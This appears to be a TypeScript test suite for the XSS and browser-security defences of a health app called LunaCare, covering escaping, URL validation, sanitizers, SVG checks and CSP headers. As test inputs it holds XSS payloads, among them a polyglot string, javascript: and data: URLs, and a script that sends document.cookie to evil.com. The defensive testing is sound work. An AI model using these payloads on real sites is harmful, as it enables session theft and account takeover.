import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import type { FastifyInstance } from 'fastify';
import { buildApp } from '../src/app.js';
import { AuthService } from '../src/auth/index.js';
import { db } from '../src/database/index.js';
import {
  escapeHtml,
  isSafeUrl,
  sanitizeUserBio,
  sanitizeAiOutput,
  isSafeSvg
} from '../src/security/index.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '../..');

describe('LunaCare Defensive XSS & Browser Security Suite', () => {
  let app: FastifyInstance;

  before(async () => {
    app = await buildApp();
    await app.ready();
  });

  after(async () => {
    db.reset();
    await app.close();
  });

  // TEST 1: Context-aware HTML entity encoding
  test('1. Context-aware HTML entity encoding escapes dangerous characters', () => {
    const raw = '<script>alert("XSS & injection \' test `/`")</script>';
    const encoded = escapeHtml(raw);

    assert.equal(encoded.includes('<script>'), false);
    assert.equal(encoded.includes('</script>'), false);
    assert.equal(encoded.includes('&amp;'), true);
    assert.equal(encoded.includes('&lt;'), true);
    assert.equal(encoded.includes('&gt;'), true);
    assert.equal(encoded.includes('&quot;'), true);
    assert.equal(encoded.includes('&#x27;'), true);
    assert.equal(encoded.includes('&#x2F;'), true);
    assert.equal(encoded.includes('&#x60;'), true);
  });

  // TEST 2: URL Scheme Validation (rejects dangerous schemes)
  test('2. isSafeUrl strictly rejects dangerous pseudo-protocols and invalid formats', () => {
    const dangerous = [
      'javascript:alert(1)',
      'JAVASCRIPT:alert(document.cookie)',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      'vbscript:msgbox(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'blob:https://example.com/uuid',
      'file:///etc/passwd',
      '//evil.com/phish',
      'https://example.com/\x00evil',
      '   ',
      '../path/traversal',
      'about:blank'
    ];

    for (const url of dangerous) {
      assert.equal(isSafeUrl(url), false, `Should reject unsafe URL: ${url}`);
    }
  });

  // TEST 3: URL Scheme Validation (accepts legitimate HTTPS and storage keys)
  test('3. isSafeUrl accepts legitimate HTTPS endpoints and safe storage keys', () => {
    const safe = [
      'https://images.lunacare.example/profiles/avatar123.jpg',
      'https://cdn.example.org/avatars/user.png?size=200',
      'user_4e39a5e3-2eaa-4820-ac16-8919c50d02a4_f4a98095.png',
      'avatars/default.webp'
    ];

    for (const url of safe) {
      assert.equal(isSafeUrl(url), true, `Should accept safe URL: ${url}`);
    }
  });

  // TEST 4: Profile API rejects dangerous avatar URL schemes
  test('4. PATCH /api/v1/users/me rejects dangerous avatar URLs with HTTP 400', async () => {
    const user = await AuthService.register({
      email: 'xss_avatar_test@example.com',
      password: 'Password123!',
      displayName: 'Avatar Test'
    });

    const maliciousAvatars = [
      'javascript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox("XSS")',
      '//attacker.com/malicious.png'
    ];

    for (const avatar of maliciousAvatars) {
      const res = await app.inject({
        method: 'PATCH',
        url: '/api/v1/users/me',
        headers: { authorization: `Bearer ${user.token}` },
        payload: { avatar }
      });

      assert.equal(res.statusCode, 400, `Expected 400 for avatar: ${avatar}`);
      const body = res.json();
      assert.equal(body.error?.code, 'VALIDATION_ERROR');
      assert.ok(
        body.error?.details?.some((d: { field: string }) => d.field === 'avatar'),
        `Expected validation error on avatar field, got: ${JSON.stringify(body)}`
      );
    }
  });

  // TEST 5: Profile API accepts safe HTTPS avatar URL
  test('5. PATCH /api/v1/users/me accepts valid HTTPS avatar URL', async () => {
    const user = await AuthService.register({
      email: 'safe_avatar_test@example.com',
      password: 'Password123!',
      displayName: 'Safe Avatar'
    });

    const res = await app.inject({
      method: 'PATCH',
      url: '/api/v1/users/me',
      headers: { authorization: `Bearer ${user.token}` },
      payload: { avatar: 'https://cdn.lunacare.example/avatars/user_safe.png' }
    });

    assert.equal(res.statusCode, 200);
    const body = res.json();
    assert.equal(body.profile.avatar, 'https://cdn.lunacare.example/avatars/user_safe.png');
  });

  // TEST 6: User bio sanitization
  test('6. sanitizeUserBio strips script tags and event handlers while preserving normal bio text', () => {
    const maliciousBio = 'Hello! <script>alert("pwn")</script>I love menstrual wellness <img src=x onerror=alert(1)> and yoga!';
    const sanitized = sanitizeUserBio(maliciousBio);

    assert.equal(sanitized.includes('<script>'), false);
    assert.equal(sanitized.includes('onerror'), false);
    assert.equal(sanitized.includes('alert('), false);
    assert.ok(sanitized.includes('Hello!'));
    assert.ok(sanitized.includes('I love menstrual wellness'));
    assert.ok(sanitized.includes('and yoga!'));
  });

  // TEST 7: AI Output Sanitization
  test('7. sanitizeAiOutput flags and escapes untrusted HTML from AI models', () => {
    const normalOutput = 'Menstrual cups are reusable medical-grade silicone devices. Clean with boiling water.';
    const res1 = sanitizeAiOutput(normalOutput);
    assert.equal(res1.containsHtmlOrScript, false);
    assert.equal(res1.safeText, normalOutput);

    const maliciousModelOutput = 'Click here: <script>document.location="http://evil.com/"+document.cookie</script> for help!';
    const res2 = sanitizeAiOutput(maliciousModelOutput);
    assert.equal(res2.containsHtmlOrScript, true);
    assert.equal(res2.safeText.includes('<script>'), false);
    assert.equal(res2.safeText.includes('&lt;script&gt;'), true);
  });

  // TEST 8: SVG Security Inspection
  test('8. isSafeSvg identifies embedded scripts, event handlers, and javascript links in SVG', () => {
    const maliciousSvg1 = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
    const res1 = isSafeSvg(maliciousSvg1);
    assert.equal(res1.safe, false);
    assert.equal(res1.reason, 'EMBEDDED_SCRIPT_TAG');

    const maliciousSvg2 = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle cx="10" cy="10" r="5"/></svg>';
    const res2 = isSafeSvg(maliciousSvg2);
    assert.equal(res2.safe, false);
    assert.equal(res2.reason, 'EVENT_HANDLER_ATTRIBUTE');

    const maliciousSvg3 = '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>Click</text></a></svg>';
    const res3 = isSafeSvg(maliciousSvg3);
    assert.equal(res3.safe, false);
    assert.equal(res3.reason, 'JAVASCRIPT_PSEUDO_PROTOCOL');

    const safeSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2z"/></svg>';
    const res4 = isSafeSvg(safeSvg);
    assert.equal(res4.safe, true);
  });

  // TEST 9: Backend Helmet Content-Security-Policy headers
  test('9. Backend API enforces restrictive CSP with base-uri, form-action, and frame-ancestors', async () => {
    const res = await app.inject({
      method: 'GET',
      url: '/healthz'
    });

    assert.equal(res.statusCode, 200);
    const csp = res.headers['content-security-policy'] as string;
    assert.ok(csp, 'CSP header must be present');
    assert.ok(csp.includes("default-src 'self'"), 'CSP must include default-src self');
    assert.ok(csp.includes("base-uri 'self'"), 'CSP must include base-uri self');
    assert.ok(csp.includes("form-action 'self'"), 'CSP must include form-action self');
    assert.ok(csp.includes("object-src 'none'"), 'CSP must include object-src none');
    assert.ok(csp.includes("frame-ancestors 'none'"), 'CSP must include frame-ancestors none');

    // Also verify nosniff and referrer headers
    assert.equal(res.headers['x-content-type-options'], 'nosniff');
    assert.equal(res.headers['referrer-policy'], 'same-origin');
  });

  // TEST 10: Public landing page HTML security meta tags
  test('10. Standalone landing page web/index.html includes restrictive CSP and nosniff meta tags', () => {
    const htmlPath = path.join(rootDir, 'web/index.html');
    const html = fs.readFileSync(htmlPath, 'utf8');

    assert.ok(html.includes('http-equiv="Content-Security-Policy"'), 'HTML must include CSP meta tag');
    assert.ok(html.includes("default-src 'self'"), 'HTML CSP must include default-src self');
    assert.ok(html.includes("script-src 'none'"), 'HTML CSP must disable scripts with script-src none');
    assert.ok(html.includes("object-src 'none'"), 'HTML CSP must disable plugins with object-src none');
    assert.ok(html.includes("base-uri 'self'"), 'HTML CSP must protect base-uri');
    assert.ok(html.includes("form-action 'self'"), 'HTML CSP must protect form-action');
    assert.ok(html.includes('http-equiv="X-Content-Type-Options" content="nosniff"'), 'HTML must include nosniff meta tag');
  });
});
